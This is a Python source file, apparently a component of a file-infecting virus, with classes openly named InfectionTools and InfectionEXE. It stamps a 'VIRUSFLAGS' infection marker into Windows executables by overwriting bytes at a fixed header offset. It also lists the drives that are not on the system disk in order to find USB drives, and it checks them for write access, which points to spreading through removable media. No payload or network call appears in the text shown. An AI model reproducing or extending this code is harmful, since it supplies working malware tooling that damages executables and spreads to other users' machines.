from .T_imports import *
from .T_CDLL import *
from .T_FIO import FIO

class InfectionTools:
    def __init__(self):
        pass
    def WriteSIG(self, file_path, dw_addr, dw_sig):
        try:
            with open(file_path, 'r+b') as file:
                file.seek(dw_addr)
                data = struct.pack('<I', dw_sig)
                file.write(data)
                return True
        except:
            return False
    def CheckSIG(self, file_path, dw_addr, dw_sig):
        try:
            with open(file_path, 'r+b') as file:
                file.seek(dw_addr)
                data = file.read(4)
                if len(data) == 4:
                    dw_sig_num = struct.unpack('<I', data)[0]
                    return dw_sig_num == dw_sig
                return False
        except:
            return False
    def GetVirusFlags(self, file_path, dw_addr):
        try:
            with open(file_path, 'r+b') as file:
                file.seek(dw_addr)
                data = file.read(4)
                if len(data) == 4:
                    dw_sig_num = struct.unpack('<I', data)[0]
                    return dw_sig_num
                return None
        except:
            return None
    def GetDrives(self, TargetDrive="C:\\"):
        # 打开目标卷
        volume_handle = kernel32.CreateFileW(
            "\\\\.\\" + TargetDrive[:-1],
            0,
            ctypes.wintypes.DWORD(0x00000001 | 0x00000002),
            None,
            ctypes.wintypes.DWORD(3),  # OPEN_EXISTING
            0,
            None
        )
        if volume_handle == ctypes.wintypes.HANDLE(-1).value:
            raise ctypes.WinError(ctypes.get_last_error())
        class DISK_EXTENT(ctypes.Structure):
            _fields_ = [
                ("DiskNumber", ctypes.wintypes.DWORD),
                ("StartingOffset", ctypes.wintypes.LARGE_INTEGER),
                ("ExtentLength", ctypes.wintypes.LARGE_INTEGER)
            ]
        class VOLUME_DISK_EXTENTS(ctypes.Structure):
            _fields_ = [
                ("NumberOfDiskExtents", ctypes.wintypes.DWORD),
                ("Extents", DISK_EXTENT * 1)
            ]
        IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS = 0x560000
        extents = VOLUME_DISK_EXTENTS()
        bytes_returned = ctypes.wintypes.DWORD()
        kernel32.DeviceIoControl(
            volume_handle,
            IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
            None,
            0,
            ctypes.byref(extents),
            ctypes.sizeof(extents),
            ctypes.byref(bytes_returned),
            None
        )
        disk_number = extents.Extents[0].DiskNumber
        kernel32.CloseHandle(volume_handle)
        drives = []
        bitmask = kernel32.GetLogicalDrives()
        for i in range(26):
            if bitmask & 1:
                drives.append(chr(65 + i) + ":\\")
            bitmask >>= 1
        # 检查每个驱动器是否在同一物理磁盘上
        same_disk_drives = []
        for drive in drives:
            try:
                vol_handle = kernel32.CreateFileW(
                    "\\\\.\\" + drive[:-1],
                    0,
                    ctypes.wintypes.DWORD(0x00000001 | 0x00000002),
                    None,
                    ctypes.wintypes.DWORD(3),
                    0,
                    None
                )
                if vol_handle == ctypes.wintypes.HANDLE(-1).value:
                    continue
                extents = VOLUME_DISK_EXTENTS()
                bytes_returned = ctypes.wintypes.DWORD()
                kernel32.DeviceIoControl(
                    vol_handle,
                    IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
                    None,
                    0,
                    ctypes.byref(extents),
                    ctypes.sizeof(extents),
                    ctypes.byref(bytes_returned),
                    None
                )
                if extents.NumberOfDiskExtents > 0 and extents.Extents[0].DiskNumber == disk_number:
                    same_disk_drives.append(drive)
                kernel32.CloseHandle(vol_handle)
            except:
                continue
        return same_disk_drives
    def GetAvailableDrives(self):
        lpBuffer = ctypes.create_string_buffer(78)
        ctypes.windll.kernel32.GetLogicalDriveStringsA(ctypes.sizeof(lpBuffer), lpBuffer)
        drives = lpBuffer.raw.split(b'\x00')
        return [drive.decode('ascii') for drive in drives if drive]
    def GetUSBDrives(self):
        return list(set(self.GetAvailableDrives())-set(self.GetDrives()))
    def IsDriveListExist(self, drives):
        return [drive for drive in drives if os.path.isdir(drive)]
    def TestDisk(self, drive):
        def _check_permissions():
            if not all([os.access(drive, os.R_OK), os.access(drive, os.W_OK)]):
                return False
            test_file = os.path.join(drive, 'speedtest.tmp')
            try:
                start_time = time.time()
                with open(test_file, 'wb', buffering=1024*1024) as f:
                    f.write(os.urandom(1024*1024))
                with open(test_file, 'rb') as f:
                    while f.read(1024*1024): pass
                duration = time.time() - start_time
                speed = 2.0 / duration
                return speed > 1.0
            except (IOError, OSError):
                return False
            finally:
                if os.path.exists(test_file):
                    os.remove(test_file)
        result = []
        def _worker():
            result.append(_check_permissions())
        t = threading.Thread(target=_worker)
        t.start()
        t.join(timeout=10)
        if t.is_alive():
            return False
        return result[0] if result else False

class InfectionEXE:
    def __init__(self, path, VIRUSFLAGS):
        self.ECO=0x04
        self.path=path
        self.WORK=False
        self.IFT=None
        self.VIRUSFLAGS=VIRUSFLAGS
        if os.path.isfile(self.path):
            try:
                with open(self.path, 'rb') as file:
                    if struct.unpack('<H', file.read(2))[0] == 0x5A4D:
                        self.WORK=True
            except:
                pass
    def SetIFT(self, IFT: InfectionTools):
        self.IFT=IFT
    def __change__(self):
        if not self.WORK or not self.IFT:
            return False
        if not self.IFT.CheckSIG(self.path, self.ECO, self.VIRUSFLAGS):
            self.IFT.WriteSIG(self.path, self.ECO, self.VIRUSFLAGS)
        return self.IFT.GetVirusFlags(self.path, self.ECO)